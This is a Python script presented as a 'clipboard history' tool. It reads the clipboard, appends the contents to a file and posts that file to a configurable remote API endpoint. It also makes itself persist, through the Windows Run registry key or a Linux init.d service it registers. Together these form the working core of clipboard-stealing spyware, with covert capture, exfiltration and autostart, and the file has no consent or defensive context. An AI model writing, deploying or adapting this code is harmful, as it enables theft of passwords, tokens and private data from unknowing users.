import os
import sys
import time
import requests
import pyperclip
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class ClipboardHistoryHandler(FileSystemEventHandler):
    def __init__(self, output_file, api_endpoint):
        self.output_file = output_file
        self.api_endpoint = api_endpoint
        self.clipboard_history = []

    def on_modified(self, event):
        if event.src_path == self.output_file:
            self.capture_clipboard()
            self.save_to_file()
            self.send_to_api()

    def capture_clipboard(self):
        clipboard_content = pyperclip.paste()
        if clipboard_content not in self.clipboard_history:
            self.clipboard_history.append(clipboard_content)

    def save_to_file(self):
        with open(self.output_file, 'a') as f:
            for content in self.clipboard_history:
                f.write(content + '\n')
        self.clipboard_history.clear()

    def send_to_api(self):
        with open(self.output_file, 'r') as f:
            data = f.read()
        try:
            response = requests.post(self.api_endpoint, data=data)
            if response.status_code != 200:
                print(f"Failed to send data to API: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def create_persistence_service():
    if sys.platform == 'win32':
        # Windows persistence
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'ClipboardHistoryService', 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    elif sys.platform == 'linux':
        # Linux persistence
        with open('/etc/init.d/clipboardhistory', 'w') as f:
            f.write('#!/bin/bash\n')
            f.write('python3 {} &\n'.format(sys.argv[0]))
        os.system('chmod +x /etc/init.d/clipboardhistory')
        os.system('update-rc.d clipboardhistory defaults')

